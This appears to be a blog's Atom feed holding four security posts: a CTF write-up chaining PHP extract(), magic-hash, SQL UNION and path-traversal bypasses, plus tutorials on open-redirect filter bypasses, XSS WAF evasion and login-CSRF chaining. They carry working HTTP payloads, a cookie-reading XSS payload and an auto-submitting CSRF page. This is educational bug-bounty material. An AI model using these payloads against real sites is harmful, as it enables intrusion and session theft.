@@ -1,0 +1,297 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-04-16T16:12:18+01:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">/home/Gal1leo</title><subtitle>Computer Science student. Interested in web exploitation, programming and cyber security. Occasionally partake in CTFs and bug bounties.</subtitle><entry><title type="html">Intigriti CTF — Phorrifyingp</title><link href="http://localhost:4000/2022/03/12/Intigriti-CTF-Phorrifyingp.html" rel="alternate" type="text/html" title="Intigriti CTF — Phorrifyingp" /><published>2022-03-12T00:00:00+00:00</published><updated>2022-03-12T00:00:00+00:00</updated><id>http://localhost:4000/2022/03/12/Intigriti-CTF-Phorrifyingp</id><content type="html" xml:base="http://localhost:4000/2022/03/12/Intigriti-CTF-Phorrifyingp.html"><![CDATA[<p>In this post I’ll discuss the first challenge our team solved as part of the Intigriti CTF. This was a php web challenge where we were given the source and asked to read the contents of the file to retrieve a flag.</p>
+
+<!-- read more -->
+
+<h2 id="initial-assessment">Initial Assessment</h2>
+<p>The source code for the challenge can be seen below:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?php  
+    /*  
+    &lt;flag&gt; ➡➡➡ ⛳🏁 ⬅⬅⬅ &lt;flag&gt;  
+    */  
+    if ($_SERVER['REQUEST_METHOD'] == 'POST'){  
+	    extract($_POST);  
+      
+	    if (isset($_POST['password']) &amp;&amp; md5($_POST['password']) == 'put hash here!'){  
+		    $loggedin = true;  
+	    }  
+      
+	    if (md5($_SERVER['REMOTE_ADDR']) != '92d3fd4057d07f38474331ab231e1f0d'){  
+	    header('Location: ' . $_SERVER['REQUEST_URI']);  
+	    }  
+	      
+	    if (isset($loggedin) &amp;&amp; $loggedin){  
+		    echo 'One step closer 😎&lt;br&gt;';  
+	      
+		    if (isset($_GET['action']) &amp;&amp; md5($_GET['action']) == $_GET['action']){  
+			    echo 'Really? 😅&lt;br&gt;';  
+			      
+			    $db = new SQLite3('database.db');  
+			    $sql_where = Array('1=0');  
+			      
+			    foreach ($_POST as $key =&gt; $data) {  
+				    $sql_where[] = $db-&gt;escapeString($key) . "='" . $db-&gt;escapeString($data) . "'";  
+			    }  
+			      
+			    $result = $db-&gt;querySingle('SELECT login FROM users WHERE ' . implode(' AND ', $sql_where));  
+			      
+			    if ($result == 'admin'){  
+				    echo 'Last step 🤣&lt;br&gt;';  
+			      
+				    readfile(file_get_contents('php://input'));  
+				}  
+		    }  
+	    }  
+    }  
+?&gt; 
+</code></pre></div></div>
+
+<p>We can see that this challenge will require us to bypass a number of conditional statements in order to execute the final readfile() function, where we will then need to modify our payload so that we can read a file.</p>
+
+<h2 id="step-1-were-logged-in">Step 1: We’re Logged In!</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>if (isset($loggedin) &amp;&amp; $loggedin)
+</code></pre></div></div>
+
+<p>The first important conditional statement is checking if the $loggedin variable is true. We notice a suspicious usage of the extract() function above this. This function allows variables to be extracted from arrays. It’s being run on $_POST which is our POST input (user/attacker controlled). This will allow us to not only declare variable, but also to assign values to them using POST data.</p>
+
+<p>We can simply pass a loggedin parameter with a value of true.</p>
+
+<blockquote>
+  <p>POST / HTTP/1.1 Host: phorrifyingp.ctf.intigriti.io Content-Type:
+application/x-www-form-urlencoded Content-Length: 32</p>
+
+  <p>loggedin=true</p>
+</blockquote>
+
+<p>Once sent, we see the confirmation on the page:</p>
+
+<blockquote>
+  <p>One step closer 😎</p>
+</blockquote>
+
+<h2 id="step-2-its-magic">Step 2: It’s Magic!</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>if (isset($_GET['action']) &amp;&amp; md5($_GET['action']) == $_GET['action'])
+</code></pre></div></div>
+
+<p>The next conditional statement is checking for a GET parameter named “action”. This parameter must satisfy the condition that its value is equal to its md5 value.</p>
+
+<p>This seems very unlikely. In fact, it takes a little bit of understanding about php <a href="https://www.whitehatsec.com/blog/magic-hashes/">magic hashes</a> to understand how this condition could be satisfied.</p>
+
+<p>In short, the use of “==” allows for comparison of different object types. If we wanted to compare the literal value, we’d use “===”. If we enter a String with a value such as “0e1”, this will effectively equal 0 to the power of 1 (which is 0). In fact, 0 to the power of any number will always result in 0.</p>
+
+<p>Using this logic, we simply need an input beginning with 0e and followed by a series of numbers which results in a md5 hash which also begins with 0e and is followed by a series of numbers.</p>
+
+<p>Once such input is “0e215962017”. The md5 value of which is “0e291242476940776845150308577824”.</p>
+
+<p>Placing this as a GET parameter, we will get one step closer.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /?action=0e215962017 HTTP/2
+Host: phorrifyingp.ctf.intigriti.io
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 13
+
+loggedin=true
+</code></pre></div></div>
+
+<p>We get the confirmation:</p>
+
+<blockquote>
+  <p>Really? 😅</p>
+</blockquote>
+
+<h2 id="step-3-state-of-the-union">Step 3: State Of The Union</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>if ($result == 'admin')
+</code></pre></div></div>
+
+<p>The last conditional statement checks if $result is equal to ‘admin’. This value comes from a SQL statement. Each of the parameters we pass in our POST data will become a part of this query. They are joined with the ‘AND’ condition. The clause array is initially populated with “1=0” which can never be true.</p>
+
+<p>Firstly, we encounter errors about “no such column loggedin”, which hints that we’ll need to find a way to get rid of this part of the query, we can do so by commenting it out.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1--=aaaa&amp;loggedin=true
+</code></pre></div></div>
+
+<p>Next, we notice that the current state of the query will never be true due to the “1=0” condition. This hints towards us using a UNION query to separately select the “admin” entry. We inject this into the parameter name.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /?action=0e215962017 HTTP/2
+Host: phorrifyingp.ctf.intigriti.io
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 52
+
+1/**/UNION/**/SELECT/**/"admin"--=aaaa&amp;loggedin=true
+</code></pre></div></div>
+
+<p>We receive the confirmation that we have bypassed this check:</p>
+
+<blockquote>
+  <p>Last step 🤣</p>
+</blockquote>
+
+<h2 id="step-4-traversing-the-plane">Step 4: Traversing The Plane</h2>
+
+<blockquote>
+  <p>Warning&lt;/b&gt;: 
+readfile(1/**/UNION/**/SELECT/**/"admin"–=aaaa&amp;loggedin=true):
+failed to open stream: No such file or directory in
+/var/www/html/index.php</p>
+</blockquote>
+
+<p>As we can see from the error above, the entire POST data payload is being sent into the readfile() function.</p>
+
+<p>We can enter invalid directories, as long as we traverse back out of them. Using “..” we are in effect removing it from the path <strong>before</strong> it is ever searched for.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /?action=0e215962017 HTTP/2
+Host: phorrifyingp.ctf.intigriti.io
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 108
+
+1/**/UNION/**/SELECT/**/"admin"--=a&amp;loggedin=true&amp;test=/../../../../../../../../../../var/www/html/index.php
+</code></pre></div></div>
+
+<p>And we get the flag:</p>
+
+<blockquote>
+  <p>1337UP{PHP_SCARES_ME_IT_HAUNTS_ME_WHEN_I_SLEEP_ALL_I_CAN_SEE_IS_PHP_PLEASE_SOMEONE_HELP_ME}</p>
+</blockquote>
+
+<h2 id="final-notes">Final Notes</h2>
+<p>Thanks to all members of “Team Ireland Without RE” with special thanks to <a href="https://twitter.com/0daystolive">@0daystolive</a>.</p>]]></content><author><name>Cillian</name></author><category term="ctf" /><category term="web" /><summary type="html"><![CDATA[In this post I’ll discuss the first challenge our team solved as part of the Intigriti CTF. This was a php web challenge where we were given the source and asked to read the contents of the file to retrieve a flag.]]></summary></entry><entry><title type="html">Open Redirect Filters</title><link href="http://localhost:4000/2020/05/12/Open-Redirect-Filters.html" rel="alternate" type="text/html" title="Open Redirect Filters" /><published>2020-05-12T00:00:00+01:00</published><updated>2020-05-12T00:00:00+01:00</updated><id>http://localhost:4000/2020/05/12/Open-Redirect-Filters</id><content type="html" xml:base="http://localhost:4000/2020/05/12/Open-Redirect-Filters.html"><![CDATA[<p>Today I’m writing about Open Redirect bypasses since it was my first bug I have found since returning. One I normally don’t bother reporting as it’s not usually very high paying and damages impacts ratings on H1. Nonetheless, Open Redirects are a nice starting point for any security researcher and it seems almost all of them require a filter bypass.</p>
+
+<!-- read more -->
+
+<h2 id="locating-endpoints">Locating Endpoints</h2>
+
+<p>Finding an open redirect is not an easy task. There tends to be several examples of people using google dorks to achieve this. Personally, I don’t tend to use dorks too often with bug bounty programs as it tends to be a previously exausted scope.
+Almost every beginner researcher makes the mistake of incorrectly identifying an open redirect. In short, a web application can redirect using the <code class="language-plaintext highlighter-rouge">location</code> header, a javascript <code class="language-plaintext highlighter-rouge">window.location.href</code> and a <code class="language-plaintext highlighter-rouge">&lt;meta&gt;</code> tag in HTML.
+These three options will now be explored, detailing the key differences and how they can be used to find vulnerabilities other than an open redirect, and which one should actually be reported.</p>
+
+<h2 id="location-header">Location Header</h2>
+
+<p>This is the only one which actually constitutes an open redirect by definition. This is of course an opinion, and it’s always disputed by different researchers. My reason for stating this is that the location header can be used for SSRF filter bypassing. What this means is that if you get a web application to send a request to this, it will redirect them elsewhere.
+The other two types require the user to actually load the HTML. This can be problematic, as if you’re getting a SSRF, the chances are it won’t be loading the HTML/JS files (as that would require a browser, although it works with things like Selenium).
+If a SSRF successfully redirect a javascript/meta tag, this means you could potentially use a DNS rebinding attack, and it opens a whole other layer of vulnerabilites which could result in RCE.
+Without going too much off topic, what you should check when you notice location header injection is:</p>
+
+<ul>
+  <li>Can you perform CRLF injection? Try a %0a%0d payload. If this allows you to inject a new header, then try a double CSRF (which tells the browser receiving the request that the headers are complete). After this you can put script tags which will be loaded to give you CRLFi =&gt; rXSS.</li>
+  <li>Is there user interaction? If there is user interaction required (ie you must login, or click a button, to be redirected) then it’s useless. The only positive here is that you are able to inject the URL into the HTML (since it’s putting it as a parameter on a login or a link). You should try <code class="language-plaintext highlighter-rouge">javascript:</code> URI here, which may give you what I call “Bomb XSS”. This is XSS which is stored in a page but requires user interaction. If this user interaction is “expected”, such as a login page where we expect someone to login, then it increases the severity greatly.</li>
+</ul>
+
+<h2 id="javascript-redirect">Javascript Redirect</h2>
+
+<p>For javascript redirects you will want to find where the <code class="language-plaintext highlighter-rouge">window.location.href</code> redirect is being set. Try to inject javascript here and achieve XSS. This is about all you can realistically do here.</p>
+
+<h2 id="meta-tag">Meta Tag</h2>
+
+<p>Again, you will realistically want to achieve XSS here. It’s not a traditional open redirect so I wouldn’t personally deem it to be</p>
+
+<h2 id="filter-evasion">Filter Evasion</h2>
+
+<p>Okay so imagine you have found location header injection with a valid open redirect. You are going to often need to bypass the filter. Here are the methods I usually try, in order of attempt, imagining that we wish to redirect to <code class="language-plaintext highlighter-rouge">https://google.com/</code>:</p>
+
+<ul>
+  <li>//google.com</li>
+  <li>///google.com</li>
+  <li>\/\/google.com</li>
+  <li>google%E3%80%82com</li>
+  <li>@google.com</li>
+</ul>
+
+<p>Note: The initial four are always used where the input is reflected into the header alone. This means there is nothing prepending it. Sometimes an open redirect will only redirect you to a page. Example: <code class="language-plaintext highlighter-rouge">website.com/redirect.php?url=/admin/</code>. This would redirect to <code class="language-plaintext highlighter-rouge">/admin/</code> =&gt; <code class="language-plaintext highlighter-rouge">website.com/admin/</code>. In this instance, using <code class="language-plaintext highlighter-rouge">@google.com</code> =&gt; <code class="language-plaintext highlighter-rouge">website.com@google.com</code> which redirects to <code class="language-plaintext highlighter-rouge">google.com</code>. The point to note is that there must be no slash between the initial URL and the input.</p>]]></content><author><name>Cillian</name></author><category term="open redirect" /><category term="bug bounty" /><summary type="html"><![CDATA[Today I’m writing about Open Redirect bypasses since it was my first bug I have found since returning. One I normally don’t bother reporting as it’s not usually very high paying and damages impacts ratings on H1. Nonetheless, Open Redirects are a nice starting point for any security researcher and it seems almost all of them require a filter bypass.]]></summary></entry><entry><title type="html">XSS Filter Evasion</title><link href="http://localhost:4000/2019/06/17/XSS-Filter-Evasion.html" rel="alternate" type="text/html" title="XSS Filter Evasion" /><published>2019-06-17T00:00:00+01:00</published><updated>2019-06-17T00:00:00+01:00</updated><id>http://localhost:4000/2019/06/17/XSS-Filter-Evasion</id><content type="html" xml:base="http://localhost:4000/2019/06/17/XSS-Filter-Evasion.html"><![CDATA[<p>You’re testing a web application and finally find an endpoint that is reflecting HTML code. You drop your XSS payload and BOOM! All your hopes and dreams vanish before your eyes as that damn WAF appears out of nowhere, only to laugh at you.</p>
+
+<!-- read more -->
+
+<p>In this blog post I’m going to be detailing how I successfully bypassed an XSS filter to achieve a very interesting reflected XSS vulnerability in an obvious endpoint which had clearly been tested by hundreds of security researchers before me.
+This vulnerability just so happens to be the very same one that my 2nd challenge over on <a href="http://m0z.altervista.org">My Challenge Site</a>.</p>
+
+<h2 id="the-beginning">The Beginning</h2>
+
+<p>Lets take it back to where it all started. I think this vulnerability emphasizes the fact that every little piece of information can be useful at a later date. I noticed that the website I was testing was reflecting the input of a parameter inside of an input tag. This is pretty standard behaviour and it looked something like:</p>
+
+<p><code class="language-plaintext highlighter-rouge">&lt;input name="param1" value=$param1&gt;</code></p>
+
+<p>The idea is that the corresponding value of the GET parameter <code class="language-plaintext highlighter-rouge">param1</code> is reflected into the above input box’s value. The input is escaped correctly, so the tag cannot be closed, and furthermore the characters <code class="language-plaintext highlighter-rouge">&gt;</code> and <code class="language-plaintext highlighter-rouge">&lt;</code> are completely blocked by the WAF making it virtually impossible to spawn your own HTML tags.
+The one detail you might notice about this scenario is the the value of <code class="language-plaintext highlighter-rouge">$param1</code> is not enclosed within any quotations, meaning that we can spawn a new attribute on that very same input tag by dropping a space.
+So now it seems as though we’ve cracked it, we can drop a space and use the <code class="language-plaintext highlighter-rouge">onfocus</code> event handler, along with the <code class="language-plaintext highlighter-rouge">autofocus</code> attribute to instantly execute our javascript the moment a victim visits our link. But of course this is real life, so things are never that simple!</p>
+
+<h2 id="the-waf">The WAF</h2>
+
+<p>Introducing the WAF (edgy music). WAF stands for “Web Application Firewall”, or alternativelty “What the Actual Fuck?!” which tends to be most security researcher’s reaction when they encounter it. WAF is a close relative of the equally annoying “Content Security Policy” but thankfully I didn’t have to deal with that in this case so we’ll leave that for another blog post.
+The WAF was doing 2 really distinct actions. Firstly it was completely blocking any requestions which contained HTML, which included all event handlers (<code class="language-plaintext highlighter-rouge">onfocus</code>). Secondly it was stripping key javascript functions such as <code class="language-plaintext highlighter-rouge">alert</code>, <code class="language-plaintext highlighter-rouge">prompt</code>, <code class="language-plaintext highlighter-rouge">console.log</code> and pretty much everything you would ever need for an XSS PoC. It even stripped <code class="language-plaintext highlighter-rouge">document.cookie</code>!
+It sounds pretty secure, we’re blocked from adding any event handlers, which means there is literally no way we can obtain XSS, and this is true, I didn’t find some magical way of bypassing that. I tried a lot of different handlers but in the end none of them were allowed.
+The actual solution to this lies in their “additional security measures”, which in this case was their stripping of keywords such as <code class="language-plaintext highlighter-rouge">alert</code>, <code class="language-plaintext highlighter-rouge">prompt</code>, etc. I had to think outside the box and realized a realistic attack scenario which would work in the event that the stripping happened after the blocks, which it usually would!
+The blocks were being incurred by the WAF, which read the request data before the web application ever got its hands on it. That way it could safely discard it. But then the web application was stripping those javascript keywords, which happened afterwards. The idea was to create a payload that when sent would not be blocked by the WAF, but once the application received it and stripped those keywords, it would now be a working payload.</p>
+
+<h2 id="getting-the-poc">Getting The PoC</h2>
+<p>Finally it was time to fire up a payload. We know the <code class="language-plaintext highlighter-rouge">onload</code> event handler is being blocked. We know <code class="language-plaintext highlighter-rouge">alert</code> and <code class="language-plaintext highlighter-rouge">document.cookie</code> are also both being stripped.
+So I decided that <code class="language-plaintext highlighter-rouge">alert</code> would be my ‘packaging’ which would allow me to package up the payload so that it safely evaded the WAF, but was then discarded by the web application.
+The final payload:</p>
+
+<p>` oalertnfocus=alalertert(documealertnt.cookie) autofocus`</p>
+
+<p>Which combined to spawn the full input element on the page after the <code class="language-plaintext highlighter-rouge">alert</code> keyword was stripped:</p>
+
+<p><code class="language-plaintext highlighter-rouge">&lt;input name="param1" value= onfocus=alert(document.cookie) autofocus&gt;</code></p>
+
+<h2 id="the-end">The End</h2>
+<p>I know this post was short, but I’m hoping it provided you with some thought-provoking material with regards to WAF bypassing techniques, as well as web application created filter evasion. If you have any questions, feel free to message me on twitter <a href="https://twitter.com/loosesecurity">@LooseSecurity</a> or join my <a href="https://discord.gg/qStuRZS">Discord</a>. I’m always happy to help! Thanks for reading &amp; I hope you learned something new from this article.</p>]]></content><author><name>Cillian</name></author><category term="xss" /><category term="filter evasion" /><summary type="html"><![CDATA[You’re testing a web application and finally find an endpoint that is reflecting HTML code. You drop your XSS payload and BOOM! All your hopes and dreams vanish before your eyes as that damn WAF appears out of nowhere, only to laugh at you.]]></summary></entry><entry><title type="html">Exploiting POST-Based CSRF</title><link href="http://localhost:4000/2019/05/23/Exploiting-Post-Based-CSRF.html" rel="alternate" type="text/html" title="Exploiting POST-Based CSRF" /><published>2019-05-23T00:00:00+01:00</published><updated>2019-05-23T00:00:00+01:00</updated><id>http://localhost:4000/2019/05/23/Exploiting-Post-Based-CSRF</id><content type="html" xml:base="http://localhost:4000/2019/05/23/Exploiting-Post-Based-CSRF.html"><![CDATA[<p>This article will explore a variety of methods to identify, chain and exploit POST-Based CSRF to maximize the severity of your findings.</p>
+
+<!-- read more -->
+
+<h2 id="what-is-post-based-csrf">What Is POST-Based CSRF?</h2>
+
+<p>POST-Based CSRF, as opposed to GET-Based CSRF, is a type of CSRF which affects POST requests. These, unlike GET requests, contain a body which means they cannot be exploited simply using an image. Instead, one must create a specially crafted page in order to execute the CSRF. This is where a lot of newer hackers fail, as they are not aware that this is possible, so it’s something that’s very important to be familiar with!</p>
+
+<h2 id="the-login-csrf-mistake">The Login CSRF Mistake</h2>
+
+<p>Logout CSRF is not accepted as a valid submission in a lot of bounty programs, and for a very good reason. However, a lot of bounty programs mistakingly inlude login CSRF under the same umbrella. While the severity of login CSRF is generally pretty low, it can be easily used in a chain attack to convert self XSS into stored XSS. Imagine a scenario where you identify self XSS on <code class="language-plaintext highlighter-rouge">victim.com</code>, another vulnerability which is usually out of scope due to the unlikely user interaction required to execute a payload (self XSS, generally speaking, will require the user themselves to insert the payload, arguments have been made that users could be convinced into doing so, but naturally users could be convinced to insert payloads into their browser console all the same, which would have the same desired effect). So these are 2 vulnerabilities which are “worthless” according to the majority of vulnerability disclosure programs. You find this self XSS on <code class="language-plaintext highlighter-rouge">somerandompage.php</code> and notice there is no CSRF token, or other anti-CSRF measure, on the login form (<code class="language-plaintext highlighter-rouge">login.php</code>). Firstly, you must register an account on the website (we’ll create an account called <code class="language-plaintext highlighter-rouge">user</code> with the password <code class="language-plaintext highlighter-rouge">pass</code>) and next, you should insert the payload on <code class="language-plaintext highlighter-rouge">somerandompage.php</code>. Now whenever YOU visit that page, the code will execute. In fact, whenever anyone at all who is logged into your account sees that page, they too will execute the payload. Next, we must create a page exploiting the login CSRF in order to automatically log your victim in. You then create your own website <code class="language-plaintext highlighter-rouge">evil.com</code> and include the following PoC source code:</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">&lt;!-- This is a HTML comment --&gt;</span>
+
+<span class="c">&lt;!-- Create a form pointing to the login page using the POST protocol --&gt;</span>
+<span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">"https://victim.com/login.php"</span> <span class="na">method=</span><span class="s">"POST"</span><span class="nt">&gt;</span>
+<span class="c">&lt;!-- Automatically fill the username --&gt;</span>
+<span class="nt">&lt;input</span> <span class="na">name=</span><span class="s">"username"</span> <span class="na">value=</span><span class="s">"user"</span><span class="nt">&gt;</span>
+<span class="c">&lt;!-- Automatially fill the password --&gt;</span>
+<span class="nt">&lt;input</span> <span class="na">name=</span><span class="s">"password"</span> <span class="na">value=</span><span class="s">"pass"</span><span class="nt">&gt;</span>
+<span class="c">&lt;!-- Create a login button with ID btn --&gt;</span>
+<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">id=</span><span class="s">"btn"</span><span class="nt">&gt;</span>
+<span class="nt">&lt;</span><span class="err">!</span><span class="na">-</span> <span class="na">Close</span> <span class="na">the</span> <span class="na">form</span> <span class="na">--</span><span class="nt">&gt;</span>
+<span class="nt">&lt;/form&gt;</span>
+
+<span class="c">&lt;!-- Now we must automatically execute the form when a user visits our site, using javascript --&gt;</span>
+<span class="nt">&lt;script&gt;</span>
+<span class="c1">//This is a javascript comment</span>
+<span class="c1">//Simply click the button with ID btn</span>
+<span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">btn</span><span class="dl">"</span><span class="p">).</span><span class="nx">click</span><span class="p">();</span>
+<span class="c1">//End of script</span>
+<span class="nt">&lt;/script&gt;</span>
+<span class="c">&lt;!-- Whenever a user visits this page, they will automatically login to your account --&gt;</span>
+</code></pre></div></div>
+
+<p>So that’s cool and all, but we still haven’t actually got the user to visit <code class="language-plaintext highlighter-rouge">somerandompage.php</code> to execute the payload. It seems as though they must automatically visit this, or we have to yet again convince them to click another link, which of course would decrease the severity. This is not the case though! I’ve been experimenting with this recently, to improve the impact of some similar vulnerabilities I’ve discovered and have been creating a second page on the website <code class="language-plaintext highlighter-rouge">evil.com</code> and automatically opening it up in a new tab once a user visits the first page, and then waiting some time (using javascript) before redirecting to <code class="language-plaintext highlighter-rouge">somerandompage.php</code> should work. There are multiple solutions for this, but it feels elegant to wait a few seconds (while the POST request executes) before doing a redirect. This should then redirect them to the page (using the cookies they now have) and execute the payload.</p>
+
+<h2 id="the-anonymous-forms-csrf-mistake">The ‘Anonymous Forms’ CSRF Mistake</h2>
+<p>You might have figured by now, that when exploiting POST-Based CSRF to get us XSS, we tend to primarily focus on CSRF classes which are out-of-scope. This is because we know that the only reason these are out-of-scope, is because they exist. So, if we find Self XSS, similar to above, in one of these ‘anonymous forms’ (which just means you don’t have to be logged in to use it/it is in no way connected to your account), then we are easily able to exploit this to get XSS using the same method mentioned above.</p>
+
+<h2 id="identifying-post-based-csrf">Identifying POST-Based CSRF</h2>
+<p>I think before we move any further into the world of POST-Based CSRF, that’s it’s critical I mention how we actually identify this. A lot of new hackers will make some obvious mistakes here, which will lead them to wasting valuable time on an endpoint which is not vulnerable. There’s a few ways websites protect against POST-Based CSRF.</p>
+
+<h3 id="csrf-tokens">CSRF Tokens</h3>
+<p>You will see these tokens in the body of the request. This is where the data is being sent for the POST request. You’ll see it look something like this:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>xyz=123&amp;username=you&amp;password=yourpassword&amp;csrf_token=157be8b852cb6dd8536cb4d662718825
+</code></pre></div></div>
+
+<p>The first 3 parameters <code class="language-plaintext highlighter-rouge">xyz</code>, <code class="language-plaintext highlighter-rouge">username</code> and <code class="language-plaintext highlighter-rouge">password</code> could literally be anything, but it’s the <code class="language-plaintext highlighter-rouge">csrf_token</code> that we care about. Remember, this could be literally anything. If you see this, it doesn’t mean it’s not vulnerable! Try omitting it, or removing a single character (what I do). Sometimes they will check that the parameter is set, but forget to check the value of it!</p>
+
+<h3 id="csrf-headers">CSRF Headers</h3>
+<p>Some websites utilize headers for their CSRF tokens. It’ll look something like: <code class="language-plaintext highlighter-rouge">X-CSRF-Token</code> and will contain another string. I recommend for testing this, to remove all ‘non predictable’ parameters from both the body &amp; headers of the request. Cookies are an exception, as the browser automatically accepts this. Every ‘static’ parameter you can add to your exploit script (for the body). The header, you really can’t modify, so you’re going to want to remove everything that the browser doesn’t automatically place there from the intercepted request!</p>
+
+<h3 id="referer-headers">Referer Headers</h3>
+<p>The <code class="language-plaintext highlighter-rouge">referer</code> header (which humourously misspells ‘referrer’), is another method I encountered recently which actually prevented CSRF. However, the website in question didn’t validate that the <code class="language-plaintext highlighter-rouge">referer</code> header was coming from the same origin. The browser will automatically add the origin of our exploit script to the <code class="language-plaintext highlighter-rouge">referer</code> header when we actually use the exploit script I posted above! So that actually bypassed the protection for me.</p>
+
+<h2 id="the-end">The End</h2>
+<p>Now that you know what POST-Based CSRF is, how to exploit it, why we care about it &amp; how to get those valuable bounties from it, I think it’s time to end this post. If you have any questions, feel free to message me on twitter <a href="https://twitter.com/loosesecurity">@LooseSecurity</a>. I’m always happy to help! Thanks for reading &amp; I hope you learned something new from this article.</p>]]></content><author><name>Cillian</name></author><category term="csrf" /><category term="bug bounty" /><summary type="html"><![CDATA[This article will explore a variety of methods to identify, chain and exploit POST-Based CSRF to maximize the severity of your findings.]]></summary></entry></feed>
